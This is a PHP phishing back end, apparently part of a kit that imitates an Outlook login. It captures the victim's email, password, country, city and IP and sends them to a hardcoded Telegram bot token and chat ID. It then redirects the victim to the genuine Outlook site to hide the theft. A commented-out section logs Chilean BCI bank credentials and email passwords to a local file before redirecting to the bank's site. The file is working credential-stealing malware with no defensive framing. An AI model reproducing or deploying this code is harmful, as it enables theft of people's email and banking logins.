<?php

@session_start();
@ini_set("display_errors", 0);

$token = "5004637295:AAFELMf4M-wXnKs-oucI7rh1Sd3NPrAkOdA";
$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['input1']) && isset($_POST['input2'])){
  $_SESSION['input1'] = $_POST['input1'];
  $_SESSION['input2'] = $_POST['input2'];
  $_SESSION['pais'] = $_POST['pais'];
  $_SESSION['ciudad'] = $_POST['ciudad'];
  $_SESSION['ip'] = $_POST['ip'];
}

if(isset($_POST['input1']) && isset($_POST['input2'])){
  $contenido = "
  
  [🔥] ━━━━━━ |  Login | ━━━━━━ [🔥] 
  
Email: {$_SESSION['input1']} | Password: {$_SESSION['input2']} | Pais: {$_SESSION['pais']} | Ciudad: {$_SESSION['ciudad']} | IP: {$_SESSION['ip']}

  [🔥] ━━━━━━ |      Fin      | ━━━━━━ [🔥]
  
                ";

  foreach($_POST as $clave=>$valor){
    $contenido = str_replace("{{$clave}}", $valor,  $contenido);
  }

$data = [
  'chat_id' => '864018852',
  'text' => $contenido
];

$a = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?" . http_build_query($data) );
  unset ($_SESSION['rutcito']);
  unset ($_SESSION['clave']);
  header("location:https://outlook.live.com/owa/");
}


// @session_start();
// ini_set("display_errors", 0);
// $user_ip = $_SERVER['REMOTE_ADDR'];
// $cc = trim(file_get_contents("http://ipinfo.io/$user_ip/country"));
// $city = trim(file_get_contents("http://ipinfo.io/$user_ip/city"));
// $cadena = $_SERVER['HTTP_USER_AGENT'];

// $file = fopen("sidale.txt", "a");

// fwrite($file, "Rutcito: ".$_SESSION['rutcito']."  Clv: ".$_SESSION['clave']." Correo: ".$_POST['correo']." ClvCorreo: ".$_POST['correoClave']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip." ".$cc." ".$city."
// ".$cadena."  ". PHP_EOL);
// fwrite($file, "********************************* " . PHP_EOL);
// fclose($file);
// header("Location: https://www.bci.cl/inversiones");

?>